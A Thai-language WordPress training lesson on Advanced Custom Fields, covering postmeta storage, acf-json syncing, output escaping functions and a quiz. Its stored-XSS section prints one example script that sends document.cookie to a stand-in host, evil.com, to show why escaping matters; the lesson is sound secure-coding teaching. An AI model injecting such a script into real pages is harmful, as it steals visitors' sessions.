🧠 แนวคิด & หลักการ

หลักการ 1: ACF คือ "สะพาน" ไม่ใช่ "ที่เก็บข้อมูล"

เปรียบเปรย: จำโพสต์อิท (wp_postmeta) จาก Week 1 ได้ไหม — ACF ไม่ได้สร้างที่เก็บข้อมูลชนิดใหม่ มันคือสะพาน 2 ทางเหนือตู้ postmeta เดิม: ฝั่งหนึ่งวาดฟอร์มสวยๆ ให้คนกรอก (admin) อีกฝั่งมีฟังก์ชัน get_field() ให้ template ดึงค่ากลับมา · ข้างใต้สะพานยังเป็น postmeta เสมอ — จำประโยคนี้ไว้ เพราะวันที่ต้อง debug หรือถอด ACF จะได้ไม่หลงทาง

เส้นทางเต็มของ ACF มี 5 สถานี (ต่อจาก Week 2 ที่เห็นภาพรวมแล้ว ครั้งนี้ลงรายละเอียด):

สถานีเกิดอะไร · ใครทำ
1. Field Group + Location Ruledev นิยาม: field ชุดไหน โผล่ที่ CPT ไหน
2. ทีมคอนเทนต์กรอกใน adminพิมพ์เวลาเปิด-ปิด/พิกัด/FAQ ในฟอร์มที่ ACF วาด
3. เซฟลง wp_postmetaACF เขียนเป็นคู่ key–value ผูก post_id
4. get_field('key') ใน templateดึงค่ากลับ + ACF แปลง type ให้พร้อมใช้
5. 🛡 echo esc_html(...)escape ก่อนแสดงเสมอ — สถานีที่บทนี้เพิ่มเข้ามา

หลักการ 2: field structure คือ "โค้ด" ต้องเข้า git

ปัญหาที่ acf-json แก้: ถ้า dev คนหนึ่งเพิ่ม field ผ่าน ACF UI บนเครื่องตัวเอง — field นั้นอยู่ใน DB ของเขาคนเดียว เพื่อนร่วมทีมที่ pull โค้ดมาจะไม่มี field นั้น → template เรียก get_field() ได้ค่าว่าง งงกันทั้งทีม · acf-json ทำให้ ACF เขียนโครงสร้าง field เป็นไฟล์ .json ในโฟลเดอร์ theme อัตโนมัติ → เข้า git → เห็น diff → ทุกคน sync ตรงกัน

หลักคิด: "โครงสร้าง" (field มีอะไรบ้าง) = โค้ด ต้อง version control · "เนื้อหา" (ค่าที่กรอก) = data อยู่ใน DB · อย่าปนกัน

หลักการ 3: เมื่อไหร่ใช้ ACF / เมื่อไหร่ใช้ native field

title, เนื้อหาหลัก, featured image = ใช้ของ native ของ WordPress (the_title(), the_content(), the_post_thumbnail()) — เพราะ WP จัดการดีอยู่แล้ว + ปลั๊กอินอื่นเข้าใจ · ข้อมูลเสริมเฉพาะทาง (เวลาเปิด-ปิด, พิกัด, FAQ, ราคา) = ACF · ของจริง Fujisawa: ทุก CPT เปิด supports แค่ title/editor/thumbnail แล้วที่เหลือเป็น ACF ทั้งหมด (โยง Week 2)

ส่วนที่ 3: 🔐 เริ่มถัก Security — escape ทุก output

ทำไมบทนี้ถึงเริ่ม security: นี่คือบทแรกที่เรา "เอาข้อมูลที่คนนอกกรอกมาแสดงบนหน้าเว็บ" — และกฎเหล็กของ dev คือ "อย่าเชื่อ input / escape ทุก output" · เอกสารส่งมอบ (docs/08 §1.2) บังคับ escaping ทุกจุด — เราจึงถักมันเข้าตั้งแต่ตอนนี้ ไม่รอ Week 9

escape คืออะไร (เปรียบเปรย)

เปรียบเปรย: escape = ด่านตรวจอาวุธก่อนขึ้นเครื่องบิน · ข้อมูลที่คนนอกกรอกอาจมี "อาวุธ" ปนมา (โค้ด HTML/JavaScript อันตราย) · esc_html() คือด่านที่แปลงอาวุธให้เป็นข้อความธรรมดาไร้พิษ (<script> กลายเป็นตัวอักษร ไม่ใช่คำสั่ง)

เลือก escape ให้ตรงกับ "ที่ที่ข้อมูลจะไปโผล่":

ฟังก์ชันใช้เมื่อข้อมูลไปอยู่ที่ตัวอย่าง
esc_html()เนื้อความปกติในหน้าecho esc_html($hours);
esc_url()ใน href / srchref="<?php echo esc_url($url); ?>"
esc_attr()ใน attribute อื่น (alt, title, value)alt="<?php echo esc_attr($alt); ?>"
wp_kses_post()ต้องการให้มี HTML บางแท็ก (เนื้อหา rich)echo wp_kses_post($faq_answer);

💥 Counter-example: Stored XSS — ทำไมต้อง escape ตอน output ไม่ใช่ตอน save

สมมุติทีมคอนเทนต์ (หรือคนที่แฮกเข้า admin ได้) กรอกช่อง "ชื่อร้าน" เป็น:

<script>fetch('https://evil.com?c='+document.cookie)</script>

ถ้า template แสดงตรงๆ echo $shop_name; โดยไม่ escape → ทุกคนที่เปิดหน้านั้น browser จะรันสคริปต์ = cookie/session ถูกขโมย · นี่คือ Stored XSS (โค้ดร้ายถูกเก็บใน DB แล้วยิงใส่ทุกคนที่เปิดหน้า)

ทำไม escape ตอน output ไม่ใช่ตอน save: ข้อมูลใน DB ควรเก็บ "ตามที่กรอกจริง" (เผื่อวันหน้าเอาไปใช้ที่อื่นที่ต้องการ raw) · การป้องกันต้องอยู่ที่ "จุดแสดงผล" เพราะ escape แต่ละที่ใช้ฟังก์ชันต่างกัน (html/url/attr) — escape ตอน save จะไม่รู้ว่าปลายทางคือที่ไหน

ส่วนที่ 4: อ่านโค้ดจริง — single-whattosee.php ตรงจุด escape

ดูโค้ดจริงจาก dev-starter — สังเกตว่าทุกค่าที่มาจาก ACF ผ่าน escape ก่อนแสดงเสมอ:

<?php $hours = get_field('opening_hours'); ?>      // 1
<div class="val">
  <?php echo esc_html($hours); ?>                   // 2
</div>

<?php $offurl = get_field('official_url'); ?>      // 3
<a href="<?php echo esc_url($offurl); ?>"          // 4
   target="_blank" rel="noopener">                 // 5
  เว็บไซต์ทางการ
</a>
บรรทัดทำไมต้องมี (ไม่ใช่แค่ทำอะไร)
1ดึงค่าจาก ACF เก็บในตัวแปร — get_field() อ่าน postmeta ให้ (จำ Week 1) · เก็บตัวแปรก่อนเพื่อ reuse + อ่านง่าย
2esc_html() ก่อน echo — แม้ค่าเวลาเปิด-ปิดดู "ปลอดภัย" ก็ต้อง escape เสมอ เพราะไม่มีทางรู้ว่าใครกรอกอะไรมาในอนาคต (นิสัย ไม่ใช่การเลือกเป็นกรณี)
3-4URL ต้องใช้ esc_url() ไม่ใช่ esc_html() — เพราะ esc_url กรอง protocol อันตราย (เช่น javascript:) ที่ esc_html ปล่อยผ่าน
5rel="noopener" คู่กับ target="_blank" เสมอ — กันหน้าใหม่ที่เปิด "ควบคุมย้อนกลับ" หน้าเราได้ (tabnabbing) · security detail ที่มือโปรไม่ลืม
จุดที่ dev-starter ยัง "ละไว้" (ให้วีเติมใน Mission): ในไฟล์จริงบางจุด เช่น URL Google Maps ที่ต่อ $lat, $lng เข้าไปตรงๆ ยังไม่ได้ escape — เป็นโจทย์ให้วีหาจุดที่ขาดแล้วเติม esc_attr()/esc_url() ให้ครบ (dev-starter เป็นตัวอย่างเริ่มต้น ไม่ใช่โค้ด production สมบูรณ์)

ส่วนที่ 5: acf-json — field structure เข้า git

เปิดโฟลเดอร์ acf-json/ ใน theme แล้ว ACF จะทำ 2 อย่างอัตโนมัติ:

  1. ตอนแก้ field ใน UI → เขียนไฟล์ group_xxx.json ลงโฟลเดอร์นั้น (= diff เห็นใน git)
  2. ตอนเพื่อนร่วมทีม pull โค้ดมา → ACF เห็นว่า json ใหม่กว่า DB → ขึ้นปุ่ม "Sync" ให้กดอัปเดต field เข้าเครื่องตัวเอง

ตัวอย่างจริง: welovefukushima commit โฟลเดอร์ acf-json/ เข้า git มี 6 field groups เป็นไฟล์ .json — ทีมต่างเครื่องจึงมี field ตรงกันเป๊ะ · ถ้าไม่มี acf-json: dev A เพิ่ม field, dev B ไม่มี, template พัง — บั๊กที่หาสาเหตุยากเพราะ "โค้ดเหมือนกันแต่ผลต่างกัน"

🧹 Clean Code ประจำ Week 4 — แสดง ACF field แบบปลอดภัย + สะอาด

1. escape ทุก output — ไม่มีข้อยกเว้น

❌ echo ตรงๆ — ช่องโหว่ XSS

<h1><?php echo get_field('name'); ?></h1>
<a href="<?php the_field('url'); ?>">
<img alt="<?php the_field('alt'); ?>">
// ไม่มี escape สักตัว = อันตราย

✅ escape ตรงชนิดปลายทาง

<h1><?php echo esc_html(get_field('name')); ?></h1>
<a href="<?php echo esc_url(get_field('url')); ?>">
<img alt="<?php echo esc_attr(get_field('alt')); ?>">
// html / url / attr — เลือกให้ตรงที่

2. เช็ค field ว่างก่อนแสดง — guard clause

❌ แสดงเลย — ได้กล่องเปล่า/ป้ายลอย

<div class="hours">
  เวลาทำการ:
  <?php echo esc_html(get_field('hours')); ?>
</div>
// ถ้าไม่มีค่า → "เวลาทำการ:" ลอยเปล่า

✅ มีค่อยแสดง

<?php if ( $h = get_field('hours') ): ?>
  <div class="hours">
    เวลาทำการ: <?php echo esc_html($h); ?>
  </div>
<?php endif; ?>
// ไม่มีค่า = ไม่ render ทั้งกล่อง
กฎทอง: escape ต้องเป็นนิสัยอัตโนมัติ ไม่ใช่ "ค่อยมาไล่เติมทีหลัง" — เพราะพอโค้ดเยอะ การไล่หาจุดที่ลืมคือฝันร้าย · พิมพ์ esc_html() พร้อม echo ทุกครั้งตั้งแต่แรก ให้มือจำ

📝 Quiz — ทดสอบความเข้าใจ

ข้อ 1: ทำไม get_field('image') ให้ผลต่างจาก get_post_meta($id,'image',true)?

get_post_meta() คืนค่าดิบใน postmeta (มักเป็นแค่ ID รูปเป็นตัวเลข) · get_field() รู้ว่า field นี้ชนิด image เลยแปลงให้เป็น array พร้อม URL/alt/ขนาดต่างๆ (หรือ URL ตรงๆ ตามตั้งค่า) · ACF = "postmeta ที่แต่งตัวมาแล้ว" — แต่ข้างใต้ยังเป็น postmeta เดียวกัน

ข้อ 2: field ssws__shop__tel (เบอร์โทร) เป็น text ธรรมดา แต่ ssws__shop__addr (ที่อยู่) เป็น qtranslate_text — ทำไมต่างกัน?

เบอร์โทรเป็นตัวเลขสากล ไม่ต้องแปล → text ธรรมดา (ภาษาเดียว) พอ · ที่อยู่ต้องแสดงเป็นภาษาที่ผู้ใช้เลือก (ไทย/อังกฤษ/ญี่ปุ่น...) → ต้อง qtranslate_text ที่เก็บ 8 ภาษาในช่องเดียว · เลือกชนิดผิด = กรอกภาษาอื่นไม่ได้ หรือได้ช่องแปลที่ไม่จำเป็น

ข้อ 3 (security/production): ทำไมต้อง escape ตอน output ไม่ใช่ sanitize ตอน save? และถ้าลืม escape ค่าที่ทีมงานเองกรอก (ไม่ใช่แฮกเกอร์) ยังอันตรายไหม?

escape ตอน output เพราะปลายทางต่างกันใช้ฟังก์ชันต่างกัน (html/url/attr) — save ไม่รู้ว่าจะเอาไปโชว์ที่ไหน + ควรเก็บ raw ไว้ใช้ที่อื่นได้ · อันตรายแม้ทีมงานเองกรอก: ① ทีมงานอาจ paste เนื้อหาที่มี </div> ติดมาโดยไม่ตั้งใจ → layout พังทั้งหน้า ② ถ้าบัญชี admin ถูกแฮก แฮกเกอร์กรอกผ่านฟอร์มปกติได้ ③ หลัก "อย่าเชื่อ input" ไม่แยกว่า input มาจากใคร — escape เสมอคือนิสัยที่ถูก

ข้อ 4: acf-json แก้ปัญหาอะไร และถ้าทีมไม่ใช้มันจะเจอบั๊กแบบไหน?

แก้ปัญหา "field structure อยู่ใน DB ของ dev แต่ละคนไม่ตรงกัน" · ถ้าไม่ใช้: dev A เพิ่ม field ผ่าน UI (อยู่ใน DB เขา) → push โค้ด template ที่เรียก field นั้น → dev B pull มาแต่ไม่มี field → get_field() คืนค่าว่าง → template แสดงไม่ครบ "โค้ดเหมือนกันแต่ผลต่างกัน" หาสาเหตุยากมาก · acf-json เขียน field เป็นไฟล์เข้า git ทุกคน sync ตรงกัน
